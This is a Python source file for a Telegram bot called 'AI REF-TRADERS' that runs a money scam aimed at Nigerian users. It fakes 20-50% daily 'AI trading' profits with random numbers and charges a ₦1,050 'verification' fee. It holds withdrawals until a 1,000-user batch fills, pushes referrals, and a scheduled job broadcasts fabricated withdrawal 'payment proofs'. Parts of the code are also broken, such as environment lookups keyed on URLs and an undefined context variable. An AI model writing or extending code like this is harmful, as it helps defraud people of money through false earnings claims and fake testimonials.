import os
import logging
import asyncio
import random
from datetime import datetime, timedelta
from typing import Optional, Dict, List
from enum import Enum
import pytz
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackContext,
    CallbackQueryHandler
)
import httpx

# ===== CONFIGURATION =====
TOKEN = os.getenv("TELEGRAM_TOKEN")  # ✅ Correct
if not TOKEN:
    print("Error: TELEGRAM_TOKEN environment variable not set!")
    print("Please set it in Railway's Variables tab")
    exit(1)

WEBHOOK_URL = os.getenv("https://v0-paystack-backend-setup-o2dxvq4do.vercel.app/api/telegram/webhook")  # Should be your backend URL
WEB_APP_URL = os.getenv("https://v0-new-project-kpsjngutvqx.vercel.app")  # Should be your frontend URL
ADMIN_IDS = [int(id) for id in os.getenv("7484871326", "").split(",") if id]
PORT = int(os.environ.get("PORT", 8443))
NIGERIA_TZ = pytz.timezone('Africa/Lagos')

# ===== LOGGING =====
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== DATABASE SIMULATION =====
users_db: Dict[str, Dict] = {}
payments_db: List[Dict] = []
transactions_db: List[Dict] = []

# ===== ENUMS =====
class ProfitTimeRange(Enum):
    EARLY_MORNING = (0, 7, 0.35, 0.50)   # 12:01 AM - 7:00 AM, 35-50%
    DAYTIME = (8, 16, 0.21, 0.34)        # 8:00 AM - 4:00 PM, 21-34%
    EVENING = (17, 23, 0.20, 0.20)       # 5:00 PM - 11:30 PM, 20% flat

# ===== CORE BOT FUNCTIONS =====
async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    user_id = str(user.id)
    
    # Initialize user data if not exists
    if user_id not in users_db:
        users_db[user_id] = {
            "balance": 5000,
            "trading_capital": 0,
            "withdrawable_profit": 0,
            "referrals": 0,
            "ads_watched": 0,
            "verified": False,
            "trading_active": False,
            "last_ad_watch": None,
            "streak_count": 0,
            "streak_last_login": None,
            "referral_bonus_eligible": True
        }
        
        # Send comprehensive welcome message
        welcome_text = """
🇳🇬 *Welcome to AI REF-TRADERS!* 🇳🇬

Here's how to maximize your earnings:

1. *Get 6 Referrals* - Earn ₦5,000 per friend who joins
2. *Watch 20 Ads Daily* - Unlock AI Trading
3. *Activate Trading* - Earn 20-50% daily profits
4. *Play Games* - Boost your trading capital
5. *Verify Account* - Withdraw your earnings

🔥 *Pro Tip:* Complete referrals quickly to start earning faster!

*Why Payment Batches?*

The 1,000-user payment requirement is a security feature:

• Prevents fraud by requiring bulk verification
• Ensures your earnings stay safe
• Processes withdrawals efficiently in groups

Your request joins a secure queue until we reach 1,000 verified users, then all payments are released together.
"""
        await update.message.reply_text(
            welcome_text,
            parse_mode="Markdown"
        )
    
    # Check for referral parameter
    args = context.args
    if args and args[0].startswith('ref_'):
        referrer_id = args[0][4:]
        await track_referral(update, context, referrer_id)
    
    # Create deep link to web app with Telegram user ID
    web_app_deep_link = f"{WEB_APP_URL}?tg_user_id={user_id}"
    
    # Create keyboard with WebAppInfo for the Open button
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Web App", web_app=WebAppInfo(url=web_app_deep_link))],
        [InlineKeyboardButton("📤 Share Referral Link", 
          url=f"https://t.me/share/url?url=https://t.me/{(await context.bot.get_me()).username}?start=ref_{user_id}&text=Join%20AI%20REF-TRADERS%20to%20earn%20money")],
        [InlineKeyboardButton("💳 Verify Account", callback_data="verify")]
    ]
    
    await update.message.reply_text(
        f"🇳🇬 Welcome {user.first_name} to AI REF-TRADERS!\n\n"
        "💰 Current Balance: ₦5,000\n"
        "👥 Referrals: 0/6 (Earn ₦5,000 per referral)\n\n"
        "🔒 Complete 6 referrals + 20 ads to unlock withdrawals",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    # Update user's last login for streak
    await update_login_streak(user_id)
    
    # Sync with web app
    await sync_with_web_app(user_id)

# Added missing menu function
async def menu(update: Update, context: CallbackContext):
    """Display the main menu with web app buttons"""
    user = update.effective_user
    user_id = str(user.id)
    
    # Create deep links to different sections of the web app
    main_app_link = f"{WEB_APP_URL}?tg_user_id={user_id}"
    trading_link = f"{WEB_APP_URL}/trading.html?tg_user_id={user_id}"
    games_link = f"{WEB_APP_URL}/game.html?tg_user_id={user_id}"
    
    keyboard = [
        [InlineKeyboardButton("📊 Dashboard", web_app=WebAppInfo(url=main_app_link))],
        [InlineKeyboardButton("🤖 AI Trading", web_app=WebAppInfo(url=trading_link))],
        [InlineKeyboardButton("🎮 Games", web_app=WebAppInfo(url=games_link))],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("💰 Withdraw", callback_data="withdraw")]
    ]
    
    await update.message.reply_text(
        "📱 <b>AI REF-TRADERS Menu</b>\n\nChoose an option below:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def calculate_daily_profit(user_id: str):
    user = users_db[user_id]
    if not user['trading_active']:
        return 0
    
    now = datetime.now(NIGERIA_TZ)
    current_hour = now.hour
    
    # Determine profit range
    for time_range in ProfitTimeRange:
        start, end, min_profit, max_profit = time_range.value
        if start <= current_hour <= end:
            profit_pct = random.uniform(min_profit, max_profit)
            break
    else:
        profit_pct = 0  # Outside defined ranges
    
    daily_profit = user['trading_capital'] * profit_pct
    user['withdrawable_profit'] += daily_profit
    
    # Record transaction
    transactions_db.append({
        "user_id": user_id,
        "amount": daily_profit,
        "type": "profit",
        "status": "completed",
        "timestamp": datetime.now(NIGERIA_TZ)
    })
    
    return daily_profit

# Added missing calculate_daily_profits function for the job queue
async def calculate_daily_profits(context: CallbackContext):
    """Calculate profits for all active traders"""
    for user_id, user in users_db.items():
        if user['trading_active']:
            profit = await calculate_daily_profit(user_id)
            if profit > 0:
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"💰 AI Trading Update: You earned ₦{profit:,.2f} profit!"
                    )
                except Exception as e:
                    logger.error(f"Failed to send profit update to {user_id}: {e}")

async def check_trading_activation(user_id: str):
    user = users_db[user_id]
    
    # Check if user has completed requirements
    if user['referrals'] >= 6 and user['ads_watched'] >= 20:
        if not user['trading_active']:
            user['trading_active'] = True
            user['trading_capital'] = 5000 + (user['referrals'] * 5000)  # ₦5k signup + ₦5k per referral
            
            # Send activation message
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎉 AI Trading Activated! Your trading capital is ₦{user['trading_capital']:,}"
                )
            except Exception as e:
                logger.error(f"Failed to send activation message to {user_id}: {e}")
                
        return True
    return False

async def send_automatic_messages(context: CallbackContext):
    now = datetime.now(NIGERIA_TZ)
    
    for user_id, user in users_db.items():
        try:
            # 1. Daily reset notification (12:00 AM)
            if now.hour == 0 and now.minute < 5:  # Send once at midnight
                if user['trading_active']:
                    user['trading_active'] = False
                    await context.bot.send_message(
                        chat_id=user_id,
                        text="⏳ Trading has been reset for the day. Watch 20 ads to activate trading again!"
                    )
            
            # 2. Reminder to watch ads (if trading inactive)
            if not user['trading_active'] and 8 <= now.hour <= 20 and now.minute == 0:  # Hourly 8AM-8PM
                await context.bot.send_message(
                    chat_id=user_id,
                    text="👀 Remember to watch your 20 daily ads to activate AI trading!"
                )
            
            # 3. Game reminder (every 3 hours)
            if now.hour % 3 == 0 and now.minute < 5:  # Every 3 hours
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎮 Play games every 3 hours to increase your trading capital! Current capital: ₦{user['trading_capital']:,}"
                )
            
            # 4. Withdrawal eligibility notification
            if user['withdrawable_profit'] >= 5000:
                if not user['verified']:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text="💰 You've qualified for withdrawals! Verify your account within 36 hours to join the next payment batch."
                    )
                else:
                    batch_status = next((b for b in payments_db if not b['completed']), None)
                    if batch_status:
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=f"⏳ Payment batch progress: {batch_status['current_users']}/1000 users. Refer more friends to speed up payouts!"
                        )
        except Exception as e:
            logger.error(f"Error sending automatic message to {user_id}: {e}")

async def process_payment_batches(context: CallbackContext):
    # Get current batch
    current_batch = next((b for b in payments_db if not b['completed']), None)
    
    if not current_batch:
        # Create new batch
        new_batch = {
            'id': len(payments_db) + 1,
            'target_users': 1000,
            'current_users': 0,
            'payout_date': None,
            'completed': False
        }
        payments_db.append(new_batch)
        current_batch = new_batch
    
    # Check for eligible users
    eligible_users = [u_id for u_id, u in users_db.items() 
                    if u['verified'] and u['withdrawable_profit'] >= 5000]
    
    # Update batch count
    current_batch['current_users'] = len(eligible_users)
    
    # Process payments if threshold met
    if current_batch['current_users'] >= current_batch['target_users']:
        current_batch['completed'] = True
        current_batch['payout_date'] = datetime.now(NIGERIA_TZ)
        
        for user_id in eligible_users:
            try:
                # In production, this would call your payment processor
                amount = users_db[user_id]['withdrawable_profit']
                users_db[user_id]['withdrawable_profit'] = 0
                
                # Record transaction
                transactions_db.append({
                    "user_id": user_id,
                    "amount": amount,
                    "type": "withdrawal",
                    "status": "completed",
                    "timestamp": datetime.now(NIGERIA_TZ)
                })
                
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"💳 Payment processed! ₦{amount:,} has been sent to your bank account."
                )
            except Exception as e:
                logger.error(f"Failed to process payment for {user_id}: {e}")
        
        # Create fake payment proofs for marketing
        await send_fake_payment_proofs(context)

async def send_fake_payment_proofs(context: CallbackContext):
    """Generate fake payment proofs for promotional purposes"""
    proofs = [
        f"📢 @User_{random.randint(1000,9999)} withdrew ₦{random.randint(25000,150000):,} to GTBank",
        f"🚀 @Trader_{random.randint(1000,9999)} earned ₦{random.randint(7000,50000):,} today",
        f"💳 Payment batch completed for {random.randint(50,200)} users"
    ]
    
    for user_id in users_db:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=random.choice(proofs),
                disable_notification=True
            )
        except Exception as e:
            logger.error(f"Failed to send proof to {user_id}: {e}")

async def track_referral(update: Update, context: CallbackContext, referrer_id: str):
    """Track when users join via referral"""
    user = update.effective_user
    user_id = str(user.id)
    
    if referrer_id in users_db and user_id != referrer_id:
        referrer = users_db[referrer_id]
        
        # Only count if referrer hasn't maxed out bonuses
        if referrer['referral_bonus_eligible'] and referrer['referrals'] < 6:
            referrer['referrals'] += 1
            referrer['balance'] += 5000
            referrer['trading_capital'] += 5000
            
            # Check if they've reached 6 referrals
            if referrer['referrals'] >= 6:
                referrer['referral_bonus_eligible'] = False
                await check_trading_activation(referrer_id)
            
            # Update referral in web app
            try:
                async with httpx.AsyncClient() as client:
                    await client.post(
                        f"{WEB_APP_URL}/api/track-referral",
                        json={
                            "referrer_id": referrer_id,
                            "referred_id": user_id
                        },
                        timeout=5.0
                    )
            except Exception as e:
                logger.error(f"Error tracking referral in web app: {e}")
            
            try:
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 New referral! Total: {referrer['referrals']}/6 (₦{referrer['referrals'] * 5000:,} earned)"
                )
            except Exception as e:
                logger.error(f"Failed to send referral notification to {referrer_id}: {e}")

async def update_login_streak(user_id: str):
    """Update user's login streak"""
    today = datetime.now(NIGERIA_TZ).date()
    user = users_db[user_id]
    
    if 'streak_last_login' not in user or user['streak_last_login'] != today:
        # Check if consecutive day
        yesterday = today - timedelta(days=1)
        
        if user.get('streak_last_login') == yesterday:
            # Consecutive day - increase streak
            user['streak_count'] += 1
        else:
            # Not consecutive - reset streak
            user['streak_count'] = 1
        
        # Calculate bonus (₦500 on day 1, +₦100 each day, max ₦1,100 on day 7)
        streak_bonus = min(500 + ((user['streak_count'] - 1) * 100), 1100)
        user['balance'] += streak_bonus
        user['streak_last_login'] = today
        
        # Send streak notification
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🔥 Day {user['streak_count']} streak! ₦{streak_bonus:,} bonus added to your balance."
            )
        except Exception as e:
            logger.error(f"Failed to send streak notification to {user_id}: {e}")

async def sync_with_web_app(user_id: str):
    """Sync user data between bot and web app"""
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{WEB_APP_URL}/api/telegram/sync",
                json={
                    "user_id": user_id,
                    "user_data": users_db.get(user_id, {})
                },
                timeout=10.0
            )
            if response.status_code != 200:
                logger.error(f"Sync failed with status {response.status_code}")
    except Exception as e:
        logger.error(f"Error syncing with web app: {e}")

# ===== PAYMENT & VERIFICATION =====
async def verify_account(update: Update, context: CallbackContext):
    """Bank verification flow"""
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    verification_url = f"{WEB_APP_URL}/verify?user_id={user_id}"
    
    keyboard = [
        [InlineKeyboardButton("Pay ₦1,050 with Paystack", web_app=WebAppInfo(url=verification_url))],
        [InlineKeyboardButton("Why Verify?", callback_data="why_verify")]
    ]
    
    verify_text = """
🔒 *Account Verification Required*

To withdraw earnings, you need to:
1. Pay a *one-time ₦1,050 fee*
   - ₦550 covers operational costs
   - ₦500 is *instantly credited* to your account
2. Verify your Nigerian bank account

*Why Payment Batches?*

We process withdrawals in groups of 1,000 users because:
- Prevents fraud with bulk verification
- Keeps your earnings secure
- Ensures fast, efficient payouts

Your request joins a secure queue until we reach 1,000 verified users, then all payments are released together.
"""
    
    await query.edit_message_text(
        text=verify_text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# Added missing why_verify function
async def why_verify(update: Update, context: CallbackContext):
    """Explain verification process in detail"""
    query = update.callback_query
    await query.answer()
    
    explanation = """
*Why We Require Verification*

The ₦1,050 verification fee serves multiple purposes:

1. *Security & Fraud Prevention (₦550)*
   • KYC verification (₦150)
   • Bank API integration (₦150)
   • Fraud prevention systems (₦100)
   • Customer support (₦100)
   • Transaction fees (₦50)

2. *Account Binding Test (₦500)*
   • This amount is instantly credited to your withdrawable balance
   • Confirms your bank account is active and belongs to you
   • Prevents fraudulent withdrawals to wrong accounts
   • Demonstrates our payment system works before you withdraw profits

*Why Payment Batches?*

Processing payments in batches of 1,000 users:
• Reduces transaction fees
• Increases security through bulk verification
• Ensures all users receive payments simultaneously
• Prevents system overload

*Your ₦500 is NOT lost* - it's added to your withdrawable balance immediately!
"""
    
    keyboard = [
        [InlineKeyboardButton("Verify Now", callback_data="verify")],
        [InlineKeyboardButton("Back to Menu", callback_data="back_to_menu")]
    ]
    
    await query.edit_message_text(
        text=explanation,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_referrals(update: Update, context: CallbackContext):
    """Show referral information"""
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user_data = users_db.get(user_id, {})
    referral_count = user_data.get("referrals", 0)
    referral_earnings = referral_count * 5000
    
    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    keyboard = [
        [InlineKeyboardButton("📤 Share Referral Link", 
          url=f"https://t.me/share/url?url={referral_link}&text=Join%20AI%20REF-TRADERS%20to%20earn%20money")]
    ]
    
    await query.edit_message_text(
        text=f"👥 <b>Your Referrals</b>\n\n"
             f"Total Referrals: {referral_count}/6\n"
             f"Earnings: ₦{referral_earnings:,}\n\n"
             f"Share your referral link to earn ₦5,000 per referral!",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_withdrawal(update: Update, context: CallbackContext):
    """Handle withdrawal requests"""
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user_data = users_db.get(user_id, {})
    
    if not user_data.get("verified", False):
        # Not verified - show verification prompt
        verification_url = f"{WEB_APP_URL}/verify?user_id={user_id}"
        batch_status = next((b for b in payments_db if not b['completed']), None)
        
        keyboard = [
            [InlineKeyboardButton("Verify Account", web_app=WebAppInfo(url=verification_url))],
            [InlineKeyboardButton("Check Payment Batch", callback_data="check_batch")]
        ]
        
        batch_text = (
            f"⚠️ *Withdrawal Requirements*\n\n"
            f"1. Account Verification (₦1,050)\n"
            f"2. Minimum ₦5,000 withdrawable\n"
            f"3. Payment Batch Status: {batch_status['current_users'] if batch_status else 0}/1000 users\n\n"
            f"_Verify now to join the next payout batch!_"
        )
        
        await query.edit_message_text(
            text=batch_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        # Verified - show withdrawal form
        withdrawal_url = f"{WEB_APP_URL}/withdraw?user_id={user_id}"
        batch_status = next((b for b in payments_db if not b['completed']), None)
        
        keyboard = [
            [InlineKeyboardButton("Withdraw Funds", web_app=WebAppInfo(url=withdrawal_url))],
            [InlineKeyboardButton("View Batch Status", callback_data="check_batch")]
        ]
        
        withdraw_text = (
            f"💰 *Withdrawal Available*\n\n"
            f"• Balance: ₦{user_data.get('withdrawable_profit', 0):,}\n"
            f"• Minimum: ₦5,000\n"
            f"• Batch Progress: {batch_status['current_users'] if batch_status else 0}/1000\n\n"
            f"_Withdrawals process when batch is full_"
        )
        
        await query.edit_message_text(
            text=withdraw_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# Added missing check_batch function
async def check_batch(update: Update, context: CallbackContext):
    """Show current payment batch status"""
    query = update.callback_query
    await query.answer()
    
    batch = next((b for b in payments_db if not b['completed']), None)
    if not batch:
        batch = {
            'id': 1,
            'target_users': 1000,
            'current_users': 0,
            'payout_date': None,
            'completed': False
        }
        payments_db.append(batch)
    
    progress_percent = (batch['current_users'] / batch['target_users']) * 100
    
    batch_text = (
        f"🔄 *Payment Batch #{batch['id']}*\n\n"
        f"• Progress: {batch['current_users']}/{batch['target_users']} users ({progress_percent:.1f}%)\n"
        f"• Status: {'Completed' if batch['completed'] else 'In Progress'}\n"
        f"• Estimated Completion: {(1000 - batch['current_users']) // 10} days\n\n"
        f"_Refer more friends to speed up the batch completion!_"
    )
    
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_menu")]
    ]
    
    await query.edit_message_text(
        text=batch_text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ===== ADMIN CONTROLS =====
async def admin_stats(update: Update, context: CallbackContext):
    """Admin dashboard"""
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    stats = (
        f"👥 Total Users: {len(users_db)}\n"
        f"💸 Verified Accounts: {sum(1 for u in users_db.values() if u.get('verified', False))}\n"
        f"📈 Active Traders: {sum(1 for u in users_db.values() if u.get('trading_active', False))}\n"
        f"💰 Current Payment Batch: {next((b['current_users'] for b in payments_db if not b['completed']), 0)}/1000"
    )
    
    keyboard = [
        [InlineKeyboardButton("📢 Send Announcement", callback_data="send_announcement")],
        [InlineKeyboardButton("🔄 Sync All Users", callback_data="sync_all")]
    ]
    
    await update.message.reply_text(
        stats,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# Added missing sync_all_users function
async def sync_all_users(update: Update, context: CallbackContext):
    """Sync all users with web app"""
    query = update.callback_query
    await query.answer()
    
    if update.effective_user.id not in ADMIN_IDS:
        await query.edit_message_text("Unauthorized access")
        return
    
    await query.edit_message_text("Syncing all users with web app...")
    
    for user_id in users_db:
        await sync_with_web_app(user_id)
    
    await query.edit_message_text("All users synced successfully!")

# Added missing setup_bot_menu function
async def setup_bot_menu(application: Application):
    """Set up the bot's menu button to open the web app"""
    try:
        # Set the bot's menu button to open the web app
        await application.bot.set_chat_menu_button(
            menu_button={"type": "web_app", "text": "Open App", "web_app": {"url": WEB_APP_URL}}
        )
        logger.info("Bot menu button configured successfully")
        
        # Set bot commands
        commands = [
            ("start", "Start the bot"),
            ("menu", "Open main menu"),
            ("referral", "Get your referral link"),
            ("help", "Get help information")
        ]
        await application.bot.set_my_commands(commands)
        logger.info("Bot commands configured successfully")
    except Exception as e:
        logger.error(f"Error setting up bot menu: {e}")

# ===== MAIN SETUP =====
def main():
    application = (
        Application.builder()
        .token(TOKEN)
        .concurrent_updates(True)  # Recommended for job queue
        .post_init(lambda app: app.job_queue)  # Ensure JobQueue is initialized
        .build()
    )
    
    # Ensure job queue is initialized
    job_queue = application.job_queue
    if job_queue is None:
        raise RuntimeError("Job queue not initialized! Ensure PTB is installed with [job-queue] extras.")
    
    # Add your jobs
    job_queue.run_repeating(send_automatic_messages, interval=60, first=10)
    job_queue.run_repeating(calculate_daily_profits, interval=3600, first=30)  # Hourly
    job_queue.run_repeating(process_payment_batches, interval=21600, first=60)  # Every 6 hours
    job_queue.run_repeating(send_fake_payment_proofs, interval=21600, first=120)  # Every 6 hours

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("stats", admin_stats))
    
    # Callback query handlers
    application.add_handler(CallbackQueryHandler(verify_account, pattern="^verify$"))
    application.add_handler(CallbackQueryHandler(handle_referrals, pattern="^referrals$"))
    application.add_handler(CallbackQueryHandler(handle_withdrawal, pattern="^withdraw$"))
    application.add_handler(CallbackQueryHandler(sync_all_users, pattern="^sync_all$"))
    application.add_handler(CallbackQueryHandler(why_verify, pattern="^why_verify$"))
    application.add_handler(CallbackQueryHandler(check_batch, pattern="^check_batch$"))
    
    # Set up bot menu button
    asyncio.run(setup_bot_menu(application))
    
    # Webhook setup
    if WEBHOOK_URL:
        application.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=TOKEN,
            webhook_url=f"{WEBHOOK_URL}/{TOKEN}"
        )
        logger.info(f"Webhook running at {WEBHOOK_URL}/{TOKEN}")
    else:
        application.run_polling()
        logger.info("Bot running in polling mode")

if __name__ == "__main__":
    # Initialize first payment batch
    payments_db.append({
        'id': 1,
        'target_users': 1000,
        'current_users': 0,
        'payout_date': None,
        'completed': False
    })
    
    main()
